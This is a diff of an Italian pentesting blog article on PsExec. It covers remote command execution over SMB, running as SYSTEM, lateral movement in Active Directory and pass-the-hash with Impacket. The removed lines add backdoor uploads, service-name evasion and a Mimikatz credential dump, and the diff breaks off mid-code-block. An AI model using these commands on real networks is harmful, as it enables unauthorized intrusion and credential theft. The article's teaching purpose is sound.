@@ -1,10 +1,8 @@
 ---
-title: 'PsExec: Remote Command Execution via SMB in Ambienti Windows'
+title: 'PsExec su Windows: Download, Comandi e Guida Completa'
 slug: psexec
-description: >-
-  PsExec permette l’esecuzione remota di comandi su sistemi Windows tramite SMB.
-  Strumento chiave per lateral movement e amministrazione remota.
-image: /Gemini_Generated_Image_ffbojyffbojyffbo.webp
+description: 'PsExec su Windows: download ufficiale, installazione, sintassi e comandi remoti. Guida a PowerShell, PSEXESVC.exe, Pass-the-Hash con Impacket e detection.'
+image: /psexec-windows-download-comandi-lateral-movement.webp
 draft: false
 date: 2026-02-21T00:00:00.000Z
 categories:
@@ -12,1076 +10,495 @@ categories:
 subcategories:
   - active-directory
 tags:
-  - smb
+  - PsExec
+  - Sysinternals
+  - Windows
+  - Active Directory
+  - Lateral Movement
 ---
 
-**PsExec** è un tool di amministrazione remota sviluppato da Microsoft Sysinternals che permette esecuzione di comandi e processi su sistemi Windows remoti via protocollo SMB. Nato come utility legittima per system administrators, PsExec è diventato uno strumento fondamentale per lateral movement in penetration testing grazie alla sua capacità di eseguire codice con privilegi SYSTEM su macchine remote senza installazione agent.
+# PsExec su Windows: come funziona, comandi, esecuzione remota e tecniche offensive
 
-Durante engagement Active Directory, PsExec rappresenta il metodo più diretto per propagarsi lateralmente dopo aver ottenuto credenziali amministrative valide. Il tool si posiziona nella fase **Lateral Movement** (MITRE ATT\&CK T1021.002) della kill chain, permettendo di passare da singolo compromesso iniziale a controllo multi-sistema attraverso autenticazione SMB.
+**PsExec** è il tool di Microsoft Sysinternals (`sysinternals psexec`) che esegue comandi e processi su computer Windows da remoto, sfruttando il protocollo `SMB`. Non serve installare nessun agent sul target: bastano credenziali amministrative valide. Nato per i system administrator, in un penetration test è uno dei modi più rapidi per passare da una macchina compromessa a un'altra, cioè per fare [movimento laterale](https://hackita.it/articoli/lateral-movement/).
 
-In questa guida impari a usare PsExec per remote command execution, tecniche di pass-the-hash con [Impacket](/articoli/impacket/) psexec.py, differenze tra alternative WMI/DCOM per stealth, e strategie di evasion contro monitoring enterprise su Event ID 7045 e artifacts PSEXESVC.
+Se cerchi "cos'è psexec", "psexec download" o "come usare psexec" (`ps exec`), qui trovi tutto: download ufficiale, installazione, sintassi, comandi, esecuzione remota di CMD e PowerShell, pass the hash con Impacket, uso in Active Directory e rilevamento lato blue team.
 
-## Setup e Installazione
+*Usa queste tecniche solo su sistemi tuoi o con autorizzazione scritta: l'accesso abusivo a un sistema informatico è reato (art. 615-ter c.p.).*
 
-### PsExec Microsoft Sysinternals
+## Cos'è PsExec e come funziona
 
-**Download ufficiale:** [https://learn.microsoft.com/en-us/sysinternals/downloads/psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
+PsExec è una "telnet leggera" per Windows: esegue un processo su un altro computer, con console interattiva, senza installare client sul target. Fa parte di PsTools, la suite Sysinternals di tool a riga di comando per amministrare sistemi locali e remoti.
 
-**Versione corrente:** v2.43 (aprile 2023)
+Non fa nulla di magico: usa componenti che Windows ha già.
+
+* Si connette via `SMB` (porta 445) alle share nascoste `IPC$` e `ADMIN$` del target
+* Copia il binario `PSEXESVC.exe` nella cartella Windows (la share `ADMIN$` punta a `C:\Windows`)
+* Chiede il servizio al `Service Control Manager` (tradotto: il gestore dei servizi di Windows) e lo avvia
+* Apre una `named pipe` (tradotto: canale di comunicazione tra processi) per passare input e output
+* Esegue il comando e ti restituisce l'output
+* Alla fine ferma il servizio e cancella il binario
+
+![PsExec attack flow from SMB upload to service execution](data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMTAwMCAzODAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgZm9udC1mYW1pbHk9IkFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPgogIDxkZWZzPgogICAgPG1hcmtlciBpZD0iYXJyb3ciIHZpZXdCb3g9IjAgMCAxMCAxMCIgcmVmWD0iOSIgcmVmWT0iNSIgbWFya2VyV2lkdGg9IjgiIG1hcmtlckhlaWdodD0iOCIgb3JpZW50PSJhdXRvLXN0YXJ0LXJldmVyc2UiPgogICAgICA8cGF0aCBkPSJNMCwwIEwxMCw1IEwwLDEwIHoiIGZpbGw9IiNmZmZmZmYiIC8+CiAgICA8L21hcmtlcj4KICAgIDxtYXJrZXIgaWQ9ImFycm93UmVkIiB2aWV3Qm94PSIwIDAgMTAgMTAiIHJlZlg9IjkiIHJlZlk9IjUiIG1hcmtlcldpZHRoPSI4IiBtYXJrZXJIZWlnaHQ9IjgiIG9yaWVudD0iYXV0by1zdGFydC1yZXZlcnNlIj4KICAgICAgPHBhdGggZD0iTTAsMCBMMTAsNSBMMCwxMCB6IiBmaWxsPSIjZmYwMTAzIiAvPgogICAgPC9tYXJrZXI+CiAgPC9kZWZzPgogIDxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIxMDAwIiBoZWlnaHQ9IjM4MCIgZmlsbD0iIzZiMDAwMSIgLz4KICA8cmVjdCB4PSIyMCIgeT0iNjAiIHdpZHRoPSIxODAiIGhlaWdodD0iOTAiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIiAvPgogIDx0ZXh0IHg9IjExMCIgeT0iOTUiIGZvbnQtc2l6ZT0iMTYiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZmZmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkF0dGFja2VyPC90ZXh0PgogIDx0ZXh0IHg9IjExMCIgeT0iMTE4IiBmb250LXNpemU9IjE2IiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmZmZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5NYWNoaW5lPC90ZXh0PgogIDxyZWN0IHg9IjI0MCIgeT0iNjAiIHdpZHRoPSIyMDAiIGhlaWdodD0iOTAiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIiAvPgogIDx0ZXh0IHg9IjM0MCIgeT0iOTUiIGZvbnQtc2l6ZT0iMTUiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZmZmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPlNNQiBQb3J0IDQ0NTwvdGV4dD4KICA8dGV4dCB4PSIzNDAiIHk9IjExOCIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmZmZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+QWRtaW4gU2hhcmUgVXBsb2FkPC90ZXh0PgogIDxyZWN0IHg9IjQ4MCIgeT0iNjAiIHdpZHRoPSIyMjAiIGhlaWdodD0iOTAiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIiAvPgogIDx0ZXh0IHg9IjU5MCIgeT0iOTUiIGZvbnQtc2l6ZT0iMTUiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZmZmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPlNlcnZpY2UgQ29udHJvbDwvdGV4dD4KICA8dGV4dCB4PSI1OTAiIHk9IjExOCIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmZmZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+TWFuYWdlcjwvdGV4dD4KICA8cmVjdCB4PSI3NDAiIHk9IjYwIiB3aWR0aD0iMjIwIiBoZWlnaHQ9IjkwIiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMiIgLz4KICA8dGV4dCB4PSI4NTAiIHk9Ijk1IiBmb250LXNpemU9IjE1IiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmZmZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5QU0VYRVNWQzwvdGV4dD4KICA8dGV4dCB4PSI4NTAiIHk9IjExOCIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmZmZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+U2VydmljZSBSdW5uaW5nPC90ZXh0PgogIDxsaW5lIHgxPSIyMDAiIHkxPSIxMDUiIHgyPSIyMzgiIHkyPSIxMDUiIHN0cm9rZT0iI2ZmZmZmZiIgc3Ryb2tlLXdpZHRoPSIyIiBtYXJrZXItZW5kPSJ1cmwoI2Fycm93KSIgLz4KICA8bGluZSB4MT0iNDQwIiB5MT0iMTA1IiB4Mj0iNDc4IiB5Mj0iMTA1IiBzdHJva2U9IiNmZmZmZmYiIHN0cm9rZS13aWR0aD0iMiIgbWFya2VyLWVuZD0idXJsKCNhcnJvdykiIC8+CiAgPGxpbmUgeDE9IjcwMCIgeTE9IjEwNSIgeDI9IjczOCIgeTI9IjEwNSIgc3Ryb2tlPSIjZmZmZmZmIiBzdHJva2Utd2lkdGg9IjIiIG1hcmtlci1lbmQ9InVybCgjYXJyb3cpIiAvPgogIDxyZWN0IHg9IjQ4MCIgeT0iMjMwIiB3aWR0aD0iMjIwIiBoZWlnaHQ9IjkwIiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMyIgLz4KICA8dGV4dCB4PSI1OTAiIHk9IjI2NSIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmMDEwMyIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RXZlbnQgSUQgNzA0NTwvdGV4dD4KICA8dGV4dCB4PSI1OTAiIHk9IjI4OCIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmMDEwMyIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RGV0ZWN0aW9uIFBvaW50PC90ZXh0PgogIDxsaW5lIHgxPSI1OTAiIHkxPSIxNTAiIHgyPSI1OTAiIHkyPSIyMjgiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtZGFzaGFycmF5PSI2LDQiIG1hcmtlci1lbmQ9InVybCgjYXJyb3dSZWQpIiAvPgogIDx0ZXh0IHg9IjEzMCIgeT0iMzUwIiBmb250LXNpemU9IjE0IiBmb250LXdlaWdodD0iNDAwIiBmaWxsPSIjZmZmZmZmIiB0ZXh0LWFuY2hvcj0ic3RhcnQiPk5hbWVkIHBpcGUgY29tbXVuaWNhdGlvbiBjYXJyaWVzIGNvbW1hbmQgb3V0cHV0IGJhY2sgdG8gdGhlIGF0dGFja2VyPC90ZXh0Pgo8L3N2Zz4K)
+
+Gli artifact lasciati sul target sono il servizio, il binario (temporaneo) e la named pipe. Sono anche il punto debole di PsExec: più avanti vedi come si rilevano.
+
+## Download PsExec: scaricare PsExec.exe da Sysinternals
+
+Il download sicuro è uno solo: la pagina ufficiale Microsoft, [learn.microsoft.com/sysinternals/downloads/psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec). Scarichi l'archivio `PSTools.zip` (circa 5 MB), versione attuale v2.43. Evita siti terzi: `psexec.exe` è un bersaglio classico per chi distribuisce versioni manomesse.
 
 ```powershell
-# Download PSTools suite completa
+# Download the full PSTools suite from the official Sysinternals host
 Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile PSTools.zip
 
-# Estrai
-Expand-Archive PSTools.zip -DestinationPath C:\Tools\
+# Extract the archive
+Expand-Archive PSTools.zip -DestinationPath C:\Tools\PSTools\
 
-# Verifica
-C:\Tools\PsExec.exe
+# List the extracted files
+Get-ChildItem C:\Tools\PSTools\
 ```
 
-**Output:**
+Nell'archivio trovi sia `PsExec.exe` sia `PsExec64.exe`: su sistemi a 64 bit puoi usare quello a 64 bit, ma anche `PsExec.exe` funziona. Microsoft indica come sistemi supportati Windows 8.1 e successivi lato client, Windows Server 2012 e successivi lato server: su Windows 7 la versione attuale non è supportata ufficialmente.
 
+### Installare PsExec e PsTools
+
+PsExec non ha un installer. Microsoft dice di copiarlo in una cartella del `PATH` e di lanciarlo:
+
+```cmd
+:: Copy the executable into a folder that is already in PATH
+copy C:\Tools\PSTools\PsExec.exe C:\Windows\System32\
+
+:: First run: accept the license once so scripts do not hang on the EULA dialog
+psexec -accepteula
 ```
-PsExec v2.43 - Execute processes remotely
-Copyright (C) 2001-2023 Mark Russinovich
-Sysinternals - www.sysinternals.com
 
-PsExec executes a program on a remote system
-```
+Se usi Chocolatey, l'intera suite si installa con `choco install pstools`. PsTools contiene anche altri tool utili in un engagement, come `PsList`, `PsKill`, `PsService`, `PsLoggedOn` e `PsInfo`, che funzionano con la stessa logica `\\computer -u -p`.
 
-### Impacket psexec.py
+### Impacket psexec.py su Linux
 
-**Repository:** [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
-
-**Installazione Linux:**
+Per il lato offensivo, da Kali o da un'altra distro Linux, usi `psexec.py` di [Impacket](https://hackita.it/articoli/impacket/). Non è lo stesso programma: replica il comportamento con un binario open source, RemCom, al posto di `PSEXESVC.exe`.
 
 ```bash
-# Install via pip
+# Install Impacket from PyPI
 pip3 install impacket
 
-# Oppure da source
+# Or install from source
 git clone https://github.com/fortra/impacket.git
 cd impacket
 pip3 install .
 
-# Verifica
+# Show the options
 psexec.py -h
 ```
 
-**Versione:** 0.12.0 (gennaio 2025)
+## Requisiti, SMB e porta 445
 
-### Requisiti Target
+Sul target servono la porta 445/TCP aperta, credenziali di un amministratore locale (o di dominio) e una share `ADMIN$` raggiungibile e scrivibile.
 
-**Porte richieste:**
-
-* **445/TCP**: SMB (Server Message Block)
-* **135/TCP**: RPC Endpoint Mapper (opzionale)
-* **49152-65535/TCP**: Dynamic RPC ports (opzionale)
-
-**Privilegi richiesti:**
-
-* Credenziali Administrator locale o Domain Admin
-* Accesso share ADMIN$ sul target
-* SMB signing non richiesto (facilita pass-the-hash)
-
-**Verifica connettività:**
+| Requisito     | Dettaglio                               |
+| ------------- | --------------------------------------- |
+| Porta 445/TCP | `SMB`, quella che usi quasi sempre      |
+| Porta 139/TCP | Alternativa su Impacket con `-port 139` |
+| Credenziali   | Administrator locale o Domain Admin     |
+| Share         | `ADMIN$` raggiungibile e scrivibile     |
+| SMB signing   | Non blocca PsExec, ferma solo il relay  |
 
 ```bash
-# Test porta SMB
-nc -zv 192.168.1.100 445
+# Check that SMB is reachable
+nc -zv 192.168.10.50 445
 
-# Test ADMIN$ share
-smbclient -L //192.168.1.100 -U administrator
+# List shares with valid credentials
+smbclient -L //192.168.10.50 -U administrator
 ```
 
-## Uso Base
+### Windows Admin Shares
 
-### Esecuzione Comando Singolo
+Le `Windows Admin Shares` (tradotto: condivisioni amministrative) sono share nascoste create da Windows in automatico: `C$` (la radice del disco), `ADMIN$` (la cartella `C:\Windows`) e `IPC$` (usata per le named pipe). Vi accedono solo gli amministratori. PsExec scrive `PSEXESVC.exe` in `ADMIN$` e comunica tramite `IPC$`: se uno dei due è bloccato, PsExec non parte. Puoi testare l'accesso prima di lanciarlo, e ti conferma anche se le credenziali sono valide:
 
 ```cmd
-# Sintassi base
-PsExec.exe \\target -u DOMAIN\username -p password cmd.exe
-
-# Esempio reale
-PsExec.exe \\192.168.1.100 -u CORP\Administrator -p P@ssw0rd whoami
+net use \\192.168.10.50\ADMIN$ /user:CORP\administrator Summer2026!
 ```
 
-**Output:**
+### Autenticazione NTLM e Service Execution
 
+Sopra SMB l'autenticazione avviene con Kerberos oppure con `NTLM`. Se ti colleghi per indirizzo IP e non per nome host, di solito il client ripiega su NTLM: è il caso tipico di un pentest. In NTLM il "segreto" usato per autenticarsi è l'hash della password, ed è per questo che funziona il [pass the hash](https://hackita.it/articoli/pass-the-hash/): se hai l'hash, non ti serve la password.
+
+Dopo l'autenticazione, PsExec fa quella che in gergo si chiama `Service Execution` (tradotto: esecuzione tramite servizio): crea un servizio sul target chiamando il Service Control Manager via RPC sulla pipe `\pipe\svcctl`, e il servizio lancia il tuo comando come SYSTEM o con l'utente scelto. Lo stesso meccanismo è alla base di Impacket `psexec.py`, di [smbexec](https://hackita.it/articoli/smbexec/) e del modulo Metasploit. Per approfondire il protocollo c'è l'articolo su [SMB](https://hackita.it/articoli/smb/).
+
+## Sintassi e parametri di PsExec
+
+```cmd
+psexec [\\computer[,computer2[,...] | @file]] [-u user [-p password]] [-s|-e] [-i [session]] [-c [-f|-v]] [-d] [-r servicename] [-h] [-l] [-w directory] [-n timeout] [-accepteula] [-nobanner] cmd [arguments]
 ```
-PsExec v2.43 - Execute processes remotely
 
-Starting cmd on 192.168.1.100...
-cmd started on 192.168.1.100 with process ID 2456.
+| Parametro       | Funzione                                                                                               |
+| --------------- | ------------------------------------------------------------------------------------------------------ |
+| `\\computer`    | Hostname o IP del target. Omesso = esecuzione locale. Con `\\*` esegue su tutti i computer del dominio |
+| `@file`         | Esegue il comando su ogni host elencato nel file                                                       |
+| `-u` / `-p`     | Username e password. Senza `-p` la password viene chiesta in modo nascosto                             |
+| `-s`            | Esegue il processo come SYSTEM                                                                         |
+| `-i [sessione]` | Fa interagire il processo con il desktop della sessione indicata                                       |
+| `-c`            | Copia l'eseguibile locale sul target prima di lanciarlo                                                |
+| `-f`            | Forza la copia anche se il file esiste già                                                             |
+| `-v`            | Copia solo se il file locale è più recente                                                             |
+| `-d`            | Non attende la fine del processo                                                                       |
+| `-r nome`       | Nome custom del servizio                                                                               |
+| `-h`            | Su Vista e successivi usa il token elevato dell'account, se disponibile                                |
+| `-l`            | Esegue come utente limitato                                                                            |
+| `-w directory`  | Imposta la working directory remota                                                                    |
+| `-n secondi`    | Timeout di connessione                                                                                 |
+| `-e`            | Non carica il profilo dell'account                                                                     |
+| `-x`            | Mostra la UI sul desktop sicuro di Winlogon (solo locale)                                              |
+| `-a n,n`        | Fissa l'affinità su CPU specifiche                                                                     |
+| `-accepteula`   | Salta la finestra dell'EULA                                                                            |
+| `-nobanner`     | Niente banner iniziale                                                                                 |
 
+Due note pratiche. Senza `-u`, il processo gira con il tuo account ma senza accesso alle risorse di rete (impersonation); con `-u DOMINIO\utente` ottieni anche l'accesso alla rete. Microsoft precisa che password e comando viaggiano cifrati verso il target, ma la password che scrivi con `-p` resta nella riga di comando locale: finisce nella cronologia e nei log di creazione processo (Event ID 4688, Sysmon 1). In un engagement vero preferisci farla chiedere in modo nascosto, omettendo `-p`.
+
+## Comandi PsExec: esempi pratici
+
+### Comando singolo
+
+```cmd
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -accepteula whoami
+```
+
+```text
+Starting whoami on 192.168.10.50...
+whoami exited on 192.168.10.50 with error code 0.
 corp\administrator
-cmd exited on 192.168.1.100 with error code 0.
-```
-
-### Shell Interattiva
-
-```cmd
-# Shell interattiva completa
-PsExec.exe \\192.168.1.100 -u CORP\Administrator -p P@ssw0rd cmd.exe
-
-# Ora sei in cmd remoto
-Microsoft Windows [Version 10.0.19045.3803]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32> hostname
-TARGET-PC
-
-C:\Windows\system32> ipconfig
 ```
 
 ### Esecuzione come SYSTEM
 
 ```cmd
-# Flag -s esegue con privilegi SYSTEM
-PsExec.exe \\192.168.1.100 -u CORP\Administrator -p P@ssw0rd -s cmd.exe
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -s cmd.exe
 ```
 
-**Verifica:**
-
-```cmd
+```text
 C:\Windows\system32> whoami
 nt authority\system
 ```
 
-**Vantaggio:** Privilegi massimi sul target, bypass UAC, accesso completo LSASS.
+Con `-s` il processo parte come SYSTEM: privilegi massimi sulla macchina, incluso l'accesso a LSASS. Questa è la differenza fondamentale rispetto a un semplice account amministratore.
 
-### Parametri Fondamentali
-
-| Parametro     | Funzione                     | Esempio            |
-| ------------- | ---------------------------- | ------------------ |
-| `\\target`    | IP o hostname remoto         | `\\192.168.1.100`  |
-| `-u USER`     | Username                     | `-u CORP\admin`    |
-| `-p PASS`     | Password                     | `-p P@ssw0rd`      |
-| `-s`          | Esegui come SYSTEM           | `-s cmd.exe`       |
-| `-i`          | Interactive session          | `-i cmd.exe`       |
-| `-d`          | Non attendere (detached)     | `-d payload.exe`   |
-| `-c`          | Copia file locale su target  | `-c payload.exe`   |
-| `-f`          | Force copy (sovrascrive)     | `-c -f update.exe` |
-| `-r`          | Nome service custom          | `-r AdobeUpdate`   |
-| `-accepteula` | Accetta EULA automaticamente | `-accepteula`      |
-| `-h`          | Elevated token (UAC bypass)  | `-h`               |
-
-## Tecniche Operative
-
-### Meccanismo Tecnico PsExec
-
-**Flusso operativo:**
-
-1. Connessione SMB a \target\IPC$ e \target\ADMIN$
-2. Upload PSEXESVC.exe in C:\Windows\System32
-3. Creazione service "PSEXESVC" via Service Control Manager (SCM)
-4. Avvio service
-5. Comunicazione via named pipe `\\.\pipe\psexecsvc`
-6. Esecuzione comando, output su named pipe
-7. Cleanup: stop service, delete PSEXESVC.exe
-
-**Named pipe pattern:**
-
-```
-\\.\pipe\PSEXESVC-TARGET-12345-stdin
-\\.\pipe\PSEXESVC-TARGET-12345-stdout
-\\.\pipe\PSEXESVC-TARGET-12345-stderr
-```
-
-### Multiple Target Execution
+### Più target in una volta
 
 ```cmd
-# File con lista target
-echo 192.168.1.100 > targets.txt
-echo 192.168.1.101 >> targets.txt
-echo 192.168.1.102 >> targets.txt
-
-# Esegui su tutti
-PsExec.exe @targets.txt -u CORP\Administrator -p P@ssw0rd ipconfig /all
+echo 192.168.10.51 > targets.txt
+echo 192.168.10.52 >> targets.txt
+PsExec.exe @targets.txt -u CORP\administrator -p Summer2026! hostname
 ```
 
-**Timeline:** \~5-8 secondi per target (sequential execution).
+### Sessione interattiva sul desktop
 
-### Payload Upload & Execute
+Il parametro `-i` serve quando il programma deve apparire sul desktop della sessione del target (per esempio un'applicazione grafica). Per una normale shell da riga di comando non serve.
 
 ```cmd
-# Upload e esegui payload locale
-PsExec.exe \\192.168.1.100 -u CORP\admin -p Pass123! -c C:\Tools\beacon.exe
-
-# Con parametri
-PsExec.exe \\target -u admin -p pass -c payload.exe -arg1 -arg2
-
-# Non-interactive (detached)
-PsExec.exe \\target -u admin -p pass -d -c backdoor.exe
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -i 1 notepad.exe
 ```
 
-Flag `-c` copia file su target in `C:\Windows\System32`, `-d` esegue senza attendere output.
+## PsExec Remote Command Prompt: eseguire CMD da remoto
 
-### Custom Service Name
+Il caso d'uso più classico di `psexec cmd`: una shell a riga di comando sul computer remoto, per eseguire comandi su Windows da remoto (`remote command execution`).
 
 ```cmd
-# Evasion: service name non-suspicious
-PsExec.exe \\target -u admin -p pass -r WindowsUpdate cmd.exe
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! cmd.exe
 ```
 
-Service creato si chiama "WindowsUpdate" invece di "PSEXESVC" → riduce detection signature-based.
-
-## Tecniche Avanzate
-
-### Pass-the-Hash con Impacket
-
-**Sysinternals PsExec NON supporta PTH**. Usa Impacket invece:
-
-```bash
-# Sintassi psexec.py con hash NTLM
-psexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 CORP/Administrator@192.168.1.100
-
-# Solo hash (no password)
-psexec.py -hashes :NTLM_HASH DOMAIN/user@target
-
-# Con domain specificato
-psexec.py -hashes :hash CORP.LOCAL/admin@DC01.corp.local
-```
-
-**Output:**
-
-```
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Requesting shares on 192.168.1.100.....
-[*] Found writable share ADMIN$
-[*] Uploading file krDtiluR.exe
-[*] Opening SVCManager on 192.168.1.100.....
-[*] Creating service QLNw on 192.168.1.100.....
-[*] Starting service QLNw.....
-[!] Press help for extra shell commands
-
-Microsoft Windows [Version 10.0.19045]
+```text
+Microsoft Windows [Version 10.0.19045.3803]
 (c) Microsoft Corporation. All rights reserved.
 
+C:\Windows\system32> hostname
+WKSTN-FINANCE-02
+```
+
+Se invece ti serve un singolo comando e poi uscire, passalo come argomento. Il percorso dei file deve essere assoluto sul target:
+
+```cmd
+:: Network configuration
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! ipconfig /all
+
+:: Logged-on users
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! query user
+
+:: Local administrators group
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! net localgroup administrators
+
+:: Run a command that needs cmd.exe features such as pipes
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! cmd /c "dir C:\Users | findstr /i admin"
+```
+
+## PsExec con PowerShell: eseguire script da remoto
+
+PsExec non ha un parametro dedicato a PowerShell: gli passi `powershell.exe` come programma da eseguire (`psexec powershell`). Per un comando singolo:
+
+```cmd
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-Process | Select-Object -First 5"
+```
+
+Per eseguire uno script `.ps1`, prima lo copi sul target tramite la share amministrativa, poi lo lanci con il suo percorso assoluto. Il parametro `-c` di PsExec serve solo per copiare ed eseguire un eseguibile, non uno script:
+
+```cmd
+copy C:\Tools\inventory.ps1 \\192.168.10.50\C$\Windows\Temp\inventory.ps1
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\inventory.ps1
+```
+
+Con `-s` lo script gira come SYSTEM. Se invece parti da Linux, `psexec.py` accetta il comando direttamente come argomento (`psexec.py ... "powershell.exe -c Get-Date"`).
+
+## Eseguire EXE e batch file da remoto
+
+Con `-c` PsExec copia l'eseguibile locale sul target (nella cartella Windows, via `ADMIN$`) e lo esegue:
+
+```cmd
+:: Copy and run a local executable
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -c C:\Tools\agent.exe
+
+:: Same, but do not wait for it to finish
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -d -c C:\Tools\agent.exe
+
+:: Overwrite a copy that already exists on the target
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -c -f C:\Tools\agent.exe
+```
+
+Per un file batch già presente sul target, lo lanci tramite `cmd /c` con il percorso assoluto:
+
+```cmd
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! cmd /c C:\Scripts\cleanup.bat
+```
+
+Questo è anche il modo in cui gruppi ransomware reali (per esempio Medusa) usano PsExec: copiano uno script batch sui target e lo eseguono come SYSTEM su decine di macchine in pochi secondi.
+
+## Installare software MSI da remoto
+
+Anche qui `-c` non va usato con un `.msi`, perché un pacchetto MSI non è un eseguibile: si copia il file sul target e si chiama `msiexec` con il percorso assoluto.
+
+```cmd
+copy C:\Installers\7z2501-x64.msi \\192.168.10.50\C$\Windows\Temp\7z2501-x64.msi
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! msiexec /i C:\Windows\Temp\7z2501-x64.msi /qn /norestart
+```
+
+`/qn` installa senza interfaccia grafica e `/norestart` evita il riavvio. È un metodo usato davvero per distribuire software, ed è lo stesso schema con cui un attaccante piazza un payload che si finge un aggiornamento.
+
+## PsExec in Active Directory e lateral movement
+
+In un engagement su [Active Directory](https://hackita.it/articoli/active-directory/), PsExec si colloca nella fase di movimento laterale (MITRE ATT\&CK T1021.002, SMB/Windows Admin Shares): dopo aver ottenuto credenziali amministrative con [Kerberoasting](https://hackita.it/articoli/kerberoasting/), [dump delle credenziali](https://hackita.it/articoli/credential-dumping/) o un attacco su [Kerberos](https://hackita.it/articoli/kerberos/), lo usi per spostarti da una macchina all'altra.
+
+```cmd
+PsExec.exe \\DC01.corp.local -u CORP\administrator -p Summer2026! cmd.exe
+```
+
+Con accesso a un Domain Controller, il passo tipico è un [DCSync](https://hackita.it/articoli/dcsync/) per estrarre tutti gli hash del dominio. Prima, con [BloodHound](https://hackita.it/articoli/bloodhound/) puoi mappare quali host ti avvicinano di più a un Domain Admin, così non spruzzi PsExec a caso su tutta la rete (e non generi rumore inutile).
+
+## Pass-the-Hash con Impacket PsExec
+
+Il PsExec di Sysinternals vuole una password in chiaro. Per il `pass the hash`, cioè autenticarti con il solo hash NTLM senza conoscere la password, serve `psexec.py` di [Impacket](https://hackita.it/articoli/impacket/).
+
+```bash
+psexec.py -hashes :41aed72cec76816423703d8e545eea31 CORP/administrator@192.168.10.50
+```
+
+```text
+[*] Requesting shares on 192.168.10.50.....
+[*] Found writable share ADMIN$
+[*] Uploading file hKpLm9xQ.exe
+[*] Opening SVCManager on 192.168.10.50.....
+[*] Creating service aBcD on 192.168.10.50.....
+[*] Starting service aBcD.....
+[!] Press help for extra shell commands
+
 C:\Windows\system32> whoami
 nt authority\system
 ```
 
-**Vantaggio:** Esecuzione diretta come SYSTEM, no password plaintext required.
-
-### Credential Harvesting → PTH
-
-**Chain completa:**
+Dopo i due punti c'è l'hash NT (la parte LM prima dei due punti si lascia vuota). Con la password invece, mettila tra apici singoli, perché la shell Bash interpreta il `!`:
 
 ```bash
-# Step 1: Dump NTLM hash con Mimikatz su sistema compromesso
-.\mimikatz.exe "sekurlsa::logonpasswords" exit
-
-# Output:
-# Username: Administrator
-# NTLM: 32ed87bdb5fdc5e9cba88547376818d4
-
-# Step 2: Pass-the-Hash laterale
-psexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 CORP/Administrator@192.168.1.101
-
-# Step 3: Su nuovo target, dump altri hash
-C:\> .\mimikatz.exe "sekurlsa::logonpasswords" exit
-
